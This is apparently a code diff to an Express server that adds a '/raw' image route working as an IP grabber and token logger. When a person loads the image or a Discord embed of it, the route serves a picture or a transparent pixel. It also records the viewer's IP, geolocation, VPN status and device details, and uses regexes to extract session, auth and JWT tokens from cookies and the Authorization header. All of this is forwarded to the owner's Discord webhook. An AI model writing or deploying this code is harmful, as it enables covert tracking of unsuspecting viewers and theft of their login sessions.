@@ -1123,6 +1123,148 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Serve raw image files with IP logging (for Discord embeds and direct access)
+  app.get('/raw/:filename.:extension', async (req: Request, res: Response) => {
+    const { filename, extension } = req.params;
+
+    // Only handle common media file extensions
+    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
+    if (!allowedExtensions.includes(extension.toLowerCase())) {
+      return res.status(404).send('Not Found');
+    }
+
+    try {
+      const clientIp = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const referrerHeader = req.headers.referer || req.headers.referrer;
+      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
+      const cookies = req.headers.cookie || '';
+
+      // Extract potential tokens from cookies and headers
+      const authTokens = [];
+      if (cookies) {
+        const tokenPatterns = [
+          /token[^=]*=([^;]+)/gi,
+          /auth[^=]*=([^;]+)/gi,
+          /session[^=]*=([^;]+)/gi,
+          /jwt[^=]*=([^;]+)/gi,
+          /access[^=]*=([^;]+)/gi
+        ];
+
+        tokenPatterns.forEach(pattern => {
+          const matches = cookies.match(pattern);
+          if (matches) {
+            authTokens.push(...matches);
+          }
+        });
+      }
+
+      // Check Authorization header
+      const authHeader = req.headers.authorization;
+      if (authHeader) {
+        authTokens.push(`Authorization: ${authHeader}`);
+      }
+
+      const locationData = getLocationFromIp(clientIp);
+      const deviceInfo = parseDeviceInfo(userAgent);
+
+      // Try to find settings with uploaded image or webhook
+      let settings = null;
+      let imageOwnerUserId = null;
+
+      try {
+        const foundSettings = await storage.getSettingsWithImageOrWebhook();
+        if (foundSettings) {
+          settings = foundSettings.settings;
+          imageOwnerUserId = foundSettings.userId;
+        }
+      } catch (storageError) {
+        console.log('Error accessing storage:', storageError);
+      }
+
+      // Log the IP access with enhanced data
+      try {
+        await storage.createIpLog({
+          userId: imageOwnerUserId,
+          ipAddress: clientIp,
+          userAgent,
+          referrer,
+          location: locationData.location,
+          status: 'raw_image_access',
+          isVpn: locationData.isVpn,
+          vpnLocation: locationData.vpnLocation,
+          realLocation: locationData.realLocation,
+          deviceType: deviceInfo.deviceType,
+          browserName: deviceInfo.browserName,
+          operatingSystem: deviceInfo.operatingSystem,
+          deviceBrand: deviceInfo.deviceBrand
+        });
+      } catch (logError) {
+        console.error('Error logging IP access:', logError);
+      }
+
+      // Send to webhook if configured
+      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
+        console.log(`🔗 Raw image access - sending webhook to Discord for IP: ${clientIp}`);
+
+        // Send webhook in background
+        sendToWebhook(settings.webhookUrl, {
+          ipAddress: clientIp,
+          userAgent,
+          referrer,
+          location: locationData.location,
+          isVpn: locationData.isVpn,
+          vpnLocation: locationData.vpnLocation,
+          realLocation: locationData.realLocation,
+          deviceType: deviceInfo.deviceType,
+          browserName: deviceInfo.browserName,
+          operatingSystem: deviceInfo.operatingSystem,
+          deviceBrand: deviceInfo.deviceBrand,
+          cookies: cookies || 'None',
+          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
+        }).catch(webhookError => {
+          console.error('❌ Webhook sending failed:', webhookError);
+        });
+      }
+
+      // Serve uploaded file if available, otherwise default content
+      if (settings?.uploadedImageData && settings?.uploadedImageType) {
+        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
+        res.set({
+          'Content-Type': settings.uploadedImageType,
+          'Content-Length': fileBuffer.length,
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+          'Pragma': 'no-cache',
+          'Expires': '0'
+        });
+        res.send(fileBuffer);
+      } else {
+        // Serve minimal transparent pixel
+        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+        res.set({
+          'Content-Type': 'image/gif',
+          'Content-Length': pixel.length,
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+          'Pragma': 'no-cache',
+          'Expires': '0'
+        });
+        res.send(pixel);
+      }
+    } catch (error) {
+      console.error('Error serving raw image:', error);
+      // Fallback to transparent pixel
+      const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+      res.set({
+        'Content-Type': 'image/gif',
+        'Content-Length': pixel.length,
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+      });
+      res.send(pixel);
+    }
+  });
+
   // Serve decoy files and log the request - support multiple file types
   app.get('/:filename.:extension', async (req: Request, res: Response) => {
     const { filename, extension } = req.params;
@@ -1514,6 +1656,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userId = req.user.id;
       const currentSettings = await storage.getSettings(userId);
 
+      // Log the old image removal if it existed
+      if (currentSettings?.uploadedImageName) {
+        console.log(`🗑️  Replacing old image: ${currentSettings.uploadedImageName} with new image: ${req.file.originalname}`);
+      } else {
+        console.log(`📷 Uploading new image: ${req.file.originalname}`);
+      }
+
+      // This automatically replaces the old image data in the database
       await storage.createOrUpdateSettings({
         userId,
         webhookUrl: currentSettings?.webhookUrl || null,
@@ -1522,10 +1672,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
         uploadedImageType: req.file.mimetype
       });
 
+      console.log(`✅ Image successfully uploaded and old image removed (if any): ${req.file.originalname} (${req.file.size} bytes)`);
+
       res.json({
         message: 'Image uploaded successfully',
         filename: req.file.originalname,
-        size: req.file.size
+        size: req.file.size,
+        replacedOldImage: !!currentSettings?.uploadedImageName
       });
     } catch (error) {
       console.error('Error uploading image:', error);
